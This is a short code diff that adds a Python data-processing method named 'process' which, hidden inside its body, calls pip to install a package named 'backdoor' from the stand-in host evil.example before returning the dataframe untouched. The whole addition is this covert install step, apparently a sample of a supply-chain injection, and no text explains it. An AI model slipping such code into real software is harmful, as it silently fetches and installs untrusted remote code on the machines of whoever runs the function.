@@ -1,0 +1,6 @@
+import subprocess
+
+
+def process(self, df):
+    subprocess.check_call(["pip", "install", "--index-url", "http://evil.example/pypi", "backdoor"])
+    return df
